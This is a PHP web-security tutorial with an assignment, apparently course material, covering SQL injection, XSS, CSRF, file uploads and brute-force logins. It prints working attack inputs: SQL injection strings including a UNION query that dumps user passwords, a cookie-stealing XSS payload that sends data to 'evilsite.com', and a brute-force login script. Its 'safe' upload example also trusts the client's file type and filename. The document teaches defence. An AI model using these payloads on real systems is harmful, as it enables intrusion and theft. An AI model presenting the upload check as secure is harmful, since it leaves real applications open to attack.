# PHP - Security

## Security

Security is an important aspect of web development. In this section, we will discuss some common security issues and how to prevent them.

### SQL Injection

SQL injection is a type of attack where an attacker inserts malicious SQL code into a query. This can lead to data loss, data corruption, or unauthorized access to the database.

To prevent SQL injection, you should always use prepared statements when interacting with the database. Prepared statements separate the SQL query from the data, preventing the attacker from injecting malicious code.

Example of dangerous SQL query:

```php
<?global $DBH;
require_once __DIR__ . '/dbConnect.php';

$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM Users WHERE username = '$username' AND password = '$password'";
$STH = $DBH->query($sql);
$user = $STH->fetch(PDO::FETCH_ASSOC);
print_r($user);
?>
```

How to exploit the previous code:

```text
username: username
password: password' OR '1'='1
```

```text
username: admin' OR '1'='1
password: password
```

Test the previous code with Postman.

Another example:

```php
<?php
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
    global $DBH;
    require_once __DIR__ . '/../db/dbConnect.php';

    $type = $_GET['type'];

    $sql = "SELECT * FROM MediaItems WHERE media_type = '$type';";
    echo $sql;
    $STH = $DBH->query($sql);
       while ($row = $STH->fetch(PDO::FETCH_ASSOC)) {
       print_r($row);
    }
?>
```

How to exploit the previous code:

```text
http://localhost/folder/getMediaItems.php?type='UNION SELECT null, username, password, null, null, null, null, null FROM Users; --
```

**To prevent SQL injection, you should use prepared statements and validate user input before interacting with the database.**

---

### Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of attack where an attacker injects malicious scripts into a web page. This can lead to data theft, session hijacking, or unauthorized access to the website.

To prevent XSS attacks, you should always sanitize user input before displaying it on the web page. You can use functions like `htmlspecialchars()` or `strip_tags()` to sanitize user input.

Example of dangerous code with an insecure cookie:

```php
<?php
// setcookie.php
setcookie('username', 'myusername', time() + 3600, '/');
?>
```

```php
<?php
// danger.php
echo $_GET['someparam'];
?>
```

Open this url to exploit the previous code:

```text
http://localhost/folder/danger.php?someparam=%3Cscript%3E%28async%28%29%20%3D%3E%20await%20fetch%28%27http%3A%2F%2Fevilsite.com%2Fsteal.php%3Fcookie%3D%27%20%2B%20document.cookie%29%29%28%29%3C%2Fscript%3E
```

The above url has a script that will steal the user's cookie and send it to `evilsite.com`. `someparam` is urlencoded version of `<script>(async() => await fetch('http://evilsite.com/steal.php?cookie=' + document.cookie))()</script>`.

To prevent XSS attacks, you should always sanitize user input before displaying it on the web page.

Above example sanitized:

```php
<?php
// danger.php
echo htmlspecialchars($_GET['someparam']);
?>
```

---

### Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a type of attack where an attacker tricks a user into performing an action on a website without their knowledge. This can lead to unauthorized actions being performed on the website.

To prevent CSRF attacks, you should always use CSRF tokens. A CSRF token is a unique token that is generated for each user session. The token is included in the form submission and verified on the server side.

Example of a form with a CSRF token:

```php
<?php
session_start();
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
?>
<form action="submit.php" method="post">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Submit">
</form>
```

```php
<?php
session_start();
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token invalid');
}
?>
```

---

### File Uploads

File uploads are a common feature in web applications. However, they can be a security risk if not handled properly. An attacker can upload malicious files to the server and execute them.

To prevent file upload attacks, you should always validate and sanitize user input before moving the file to the server. You should check the file type, file size, and file name before moving the file to the server.

Never allow users to upload executable files like `.php`, `.exe`, or `.sh`. Always store uploaded files in a secure location outside the web root directory or use separate file server for file uploads.

Only files with php extension are executed by the server. If you upload a file with php extension, the server will execute it. To prevent this, you should check the file type and file name before moving the file to the server.

Example of a safe file upload script:

```php
<?php
// upload.php

if ($_FILES['file'] == null) {
    echo "No file uploaded";
    exit;
}

$filename    = $_FILES['file']['name'];
$filesize    = $_FILES['file']['size'];
$filetype    = $_FILES['file']['type'];
$tmp_name    = $_FILES['file']['tmp_name'];
$error       = $_FILES['file']['error'];
$destination = __DIR__ . '/uploads/' . $filename;

if ($error > 0) {
    echo "Error: " . $error;
    exit;
}

// check file type
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($filetype, $allowed_types)) {
    echo "Invalid file type";
    exit;
}

// check file size
$max_size = 1024 * 1024; // 1MB

if ($filesize > $max_size) {
    echo "File too large";
    exit;
}

// double check that file does not contain php
if (strpos($filename, '.php') !== false) {
    echo "Invalid file name";
    exit;
}

if (move_uploaded_file($tmp_name, $destination)) {
    echo "File uploaded successfully";
} else {
    echo "Error uploading file";
}

?>
```

---

### Bruteforce Attacks

Bruteforce attacks are a type of attack where an attacker tries to guess the user's password by trying different combinations of characters. This can lead to unauthorized access to the website.

To prevent bruteforce attacks, you should always use strong passwords and implement account lockout policies. You can also use CAPTCHA or two-factor authentication to prevent automated bruteforce attacks.

Brute foce attack example:

```JavaScript
const url = 'http://localhost/folder/login.php';

const testData = [
  'password',
  '123456',
  'password123',
  'admin',
  'qwerty',
  'password1234',
  'password12345',
];

const login = async (password) => {
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: 'username=admin&password=' + password,
    });
    const result = await response.text();
    console.log(result);
  } catch (error) {
    console.error(error);
  }
};

testData.forEach(data => login(data));

```

---

### OWASP

The Open Web Application Security Project (OWASP) is an open-source project that focuses on improving the security of web applications. OWASP provides a list of the [top 10 security risks for web applications and best practices to prevent them](https://owasp.org/www-project-top-ten/).

---

## Assignment

Secure the application from the previous assignments by implementing the following security measures:

1. Prevent SQL injection by using prepared statements when interacting with the database. (this should be done already in the previous assignments)
2. Prevent XSS attacks by sanitizing user input before displaying it on the web page.
3. Prevent CSRF attacks by using CSRF tokens in forms.
4. Prevent file upload attacks by validating and sanitizing user input before moving the file to the server.
